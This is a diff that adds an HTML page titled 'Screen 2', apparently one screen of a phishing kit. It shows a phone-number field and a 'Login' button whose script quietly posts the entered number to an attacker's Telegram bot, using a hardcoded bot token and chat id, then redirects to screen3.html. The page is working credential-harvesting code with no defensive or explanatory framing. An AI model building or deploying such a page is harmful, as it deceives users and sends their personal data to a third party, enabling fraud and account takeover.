@@ -1,0 +1,58 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Screen 2</title>
+  <style>
+    body {
+      margin: 0;
+      background: url('screen2.jpeg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-family: sans-serif;
+      height: 100vh;
+    }
+    input {
+      font-size: 20px;
+      letter-spacing: 10px;
+      background: transparent;
+      border: none;
+      border-bottom: 2px dashed white;
+      color: white;
+      text-align: center;
+      width: 80%;
+      max-width: 300px;
+      margin-top: 10px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 18px;
+      background: #00FF00;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <input type="text" id="phone" maxlength="10" placeholder="Enter Number" />
+  <button onclick="login()">Login</button>
+  <script>
+    function login() {
+      const number = document.getElementById('phone').value;
+      fetch('https://api.telegram.org/bot8261425552:AAFkM6QItg7Vyvd2UoFW7g5ultxQtb2vECI/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: '8401076081', text: 'Phone: ' + number })
+      });
+      setTimeout(() => window.location.href = "screen3.html", 3000);
+    }
+  </script>
+</body>
+</html>
